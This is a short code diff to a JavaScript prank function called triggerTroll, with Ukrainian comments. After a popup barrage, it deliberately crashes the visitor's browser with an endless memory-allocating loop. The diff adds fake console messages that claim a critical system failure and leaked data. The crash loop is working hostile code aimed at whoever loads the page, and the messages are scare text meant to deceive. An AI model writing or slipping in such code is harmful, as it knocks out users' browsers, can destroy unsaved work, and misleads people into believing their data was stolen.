@@ -160,14 +160,19 @@ function triggerTroll() {
 
         // КІНЕЦЬ (Краш через 5 секунд)
         setTimeout(() => {
-            clearInterval(popupInterval); // Зупиняємо створення нових вікон перед крашем
-            const crashArray = [];
+            console.log("CRITICAL_FAILURE: MEMORY_LEAK_START");
+            
+            clearInterval(popupInterval); 
+
+            const heavyAssault = [];
             while(true) {
-                crashArray.push(new Array(1000000).fill("SWAG"));
+                heavyAssault.push(new Array(1000000).fill("SWAG_OVERLOAD"));
+                console.error("SYSTEM_OVERFLOW_DATA_LEAKED");
             }
         }, 5000);
         
     }, 800);
 }
+
 
 
